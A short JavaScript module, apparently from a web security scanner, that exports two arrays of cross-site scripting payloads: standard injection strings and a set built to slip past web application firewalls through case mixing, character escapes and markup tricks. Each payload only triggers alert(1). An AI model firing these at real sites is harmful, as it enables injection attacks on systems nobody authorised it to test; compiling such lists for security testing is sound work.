
const defaultPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<iframe srcdoc="<script>alert(1)</script>">',
  'javascript:alert(1)',
  "';alert(1);//",
  '</script><script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  '"><svg/onload=alert(1)>',
  '-alert(1)-',
  '}alert(1);{',
  '${alert(1)}',
  '{{constructor.constructor(\'alert(1)\')()}}',
  '<img src=x onerror=eval(atob(\'YWxlcnQoMSk=\'))>',
  '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
]

const wafBypassPayloads = [
  '<img src=x onerror=\\x61lert(1)>',
  '<script>\\u0061lert(1)</script>',
  '<%00img src=x onerror=alert(1)>',
  '<SCRiPT>alert(1)</SCRiPT>',
  '<img src=x oNerRor=alert(1)>',
  '<img src=x onerror=alert&#40;1&#41;>',
  '<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
  '<svg><script>alert&#40;1&#41;</script></svg>',
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
]

module.exports = { defaultPayloads, wafBypassPayloads }
